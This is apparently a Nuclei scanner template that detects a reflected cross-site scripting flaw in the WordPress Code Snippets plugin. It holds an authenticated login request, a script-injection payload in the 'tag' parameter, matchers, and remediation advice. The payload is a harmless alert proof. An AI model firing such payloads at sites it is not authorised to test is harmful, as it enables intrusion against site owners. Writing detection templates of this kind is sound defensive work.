id: wp-code-snippets-xss

info:
  name: WordPress Code Snippets - 跨站脚本漏洞
  author: dhiyaneshDK
  severity: medium
  description: |
    该模板用于检测 WordPress Code Snippets - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-login.php`、`/wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script>` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://www.securify.nl/en/advisory/cross-site-scripting-in-code-snippets-wordpress-plugin/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  metadata:
    max-request: 2
  tags: wordpress,xss,wp-plugin,authenticated,vuln

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'
          - 'toplevel_page_snippets'
          - 'Search results in tag'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
